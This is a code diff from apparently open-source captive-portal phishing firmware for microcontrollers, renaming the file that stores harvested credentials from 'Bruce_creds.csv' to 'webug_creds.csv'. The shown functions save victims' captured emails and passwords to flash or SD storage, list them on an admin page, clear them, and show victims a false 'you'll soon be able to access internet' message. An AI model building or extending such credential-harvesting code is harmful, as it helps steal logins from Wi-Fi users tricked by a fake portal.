@@ -32,7 +32,7 @@ void handleCreds() {
         }
       }
       html_temp += "</li>\n";
-      saveToCSV("/Bruce_creds.csv", csvLine);
+      saveToCSV("/webug_creds.csv", csvLine);
       capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
       totalCapturedCredentials++;
       ep->send(200, "text/html", getHtmlContents("Please, Wait a few minutes. Soon you'll be able to access internet.")); 
@@ -255,8 +255,8 @@ String clear_GET() {
   String email = "<p></p>";
   String password = "<p></p>";
   capturedCredentialsHtml = "<p></p>";
-  if (LittleFS.begin()) if (LittleFS.exists("/Bruce_creds.csv")) LittleFS.remove("/Bruce_creds.csv");
-  if (SD.begin()) if (SD.exists("/Bruce_creds.csv")) SD.remove("/Bruce_creds.csv");
+  if (LittleFS.begin()) if (LittleFS.exists("/webug_creds.csv")) LittleFS.remove("/webug_creds.csv");
+  if (SD.begin()) if (SD.exists("/webug_creds.csv")) SD.remove("/webug_creds.csv");
   totalCapturedCredentials = 0;
   return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
 }
